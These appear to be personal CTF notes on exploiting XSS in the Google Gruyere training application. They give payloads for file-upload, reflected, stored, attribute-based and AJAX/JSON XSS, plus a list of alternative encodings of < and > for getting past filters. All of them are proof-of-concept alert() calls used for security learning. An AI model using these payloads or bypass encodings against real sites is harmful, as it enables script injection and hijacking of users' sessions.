# CTF
some reports about codelabs, wargames and CTF 

## Web Application Exploits and Defenses
[https://google-gruyere.appspot.com/](https://google-gruyere.appspot.com/)

### Cross-Site Scripting (XSS)

1. File Upload XSS
```
Upload a file with name “><img src=1 onerror=alert(document.domain)>’ brute.jpeg
```
tool to try different file upload path [w3schools](https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_fileupload_value)

2. Reflected XSS Attack

```
exploit message of unfound page, open https://google-gruyere.appspot.com/id/%3Cscript%3Ealert()%3C/script%3E

```
Other ways to write < > in url
%3e %3c
%253e %253c
%c0%be %c0%bc
%26gt; %26lt;
%26amp;gt; %26amp;lt;
\074\x3c\u003c\x3C \u003C\X3C\U003C
+ADw- +AD4-

3. Stored XSS

```
not all html syntax was blocked, for example try insert script inside valid tag, like <a onmouseover=alert(1)>hover this
```

4. XSS in HTML attribute

```
edit color style to escape value of first attribute and add script like  red' onmouseover='alert(2)
```

5.Stored XSS via AJAX

```
exploit JSON file generated as anwser to refresh button, insert unexpected lines like 

all <span style=display:none>"
+ (alert(1),"")
+ "</span>your base
```
